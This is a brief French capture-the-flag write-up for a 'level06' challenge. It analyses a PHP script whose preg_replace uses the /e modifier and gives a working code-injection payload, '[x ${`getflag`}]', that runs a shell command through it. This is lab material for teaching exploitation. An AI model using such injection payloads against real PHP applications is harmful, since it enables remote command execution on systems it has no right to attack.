Dans le level06 on as un binaire un fichier php

```php
<?php
function y($m) { 
	$m = preg_replace("/\./", " x ", $m); 
	$m = preg_replace("/@/", " y", $m); 
	return $m; 
}
function x($y, $z) { 
	$a = file_get_contents($y); 
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
	$a = preg_replace("/\[/", "(", $a); 
	$a = preg_replace("/\]/", ")", $a); 
	return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>

```
 On comprend qu'il faut passer un fichier au binaire avec du texte
 ex `toto` affiche `toto`

On decortique le code, la ligne qui nous interesse le plus est 
```php
 preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
 ```
 dans le fichier il faudrais mettre `[x des trucs]`
 cela nous affiche `des trucs`

 cela ressemple a l'excise avec le serveur perl

 on test `[x ${`getflag`}]` ca marche !

